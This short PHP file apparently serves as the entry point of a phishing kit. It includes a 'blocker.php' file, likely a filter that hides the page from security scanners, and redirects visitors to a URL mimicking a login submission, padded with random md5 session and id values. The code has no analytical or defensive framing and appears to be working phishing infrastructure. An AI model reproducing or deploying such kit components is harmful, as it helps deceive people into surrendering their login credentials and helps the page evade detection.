<?php
session_start();
include('blocker.php');
include 'bt.php';
$praga=rand();
$praga=md5($praga);

header("location: default.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");


?>